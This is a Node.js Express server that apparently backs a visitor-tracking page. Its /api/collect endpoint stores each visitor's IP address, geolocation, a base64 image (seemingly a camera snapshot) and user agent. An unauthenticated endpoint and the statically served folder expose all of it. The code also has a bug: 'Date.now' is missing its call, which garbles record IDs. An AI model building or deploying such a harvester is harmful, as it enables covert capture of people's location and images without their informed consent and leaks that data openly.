const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(express.json({ limit: '10mb' }));
app.use(cors());

// Direct root folder se files serve karne ke liye
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/viewer', (req, res) => {
    res.sendFile(path.join(__dirname, 'viewer.html'));
});

// Database Helper Functions
function readDB() {
    if (!fs.existsSync(DATA_FILE)) return {};
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (err) {
        return {};
    }
}

function writeDB(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// 30 Days Auto-Delete Cleaner
function cleanOldData() {
    let db = readDB();
    const now = new Date().getTime();
    let updated = false;

    for (let id in db) {
        const recordTime = new Date(db[id].timestamp).getTime();
        const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
        if (now - recordTime > thirtyDaysInMs) {
            delete db[id];
            updated = true;
        }
    }
    if (updated) writeDB(db);
}

// Data Collect API
app.post('/api/collect', (req, res) => {
    cleanOldData();
    let db = readDB();
    const recordId = 'ID_' + Date.now + '_' + Math.floor(Math.random() * 1000);
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    db[recordId] = {
        id: recordId,
        ip: clientIp,
        latitude: req.body.latitude || 'Not Granted (Denied)',
        longitude: req.body.longitude || 'Not Granted (Denied)',
        image_base64: req.body.image_base64 || null,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString()
    };

    writeDB(db);
    res.status(200).json({ status: 'success', message: 'Data logged successfully' });
});

// Fetch Data API
app.get('/api/get-data', (req, res) => {
    cleanOldData();
    res.status(200).json(readDB());
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
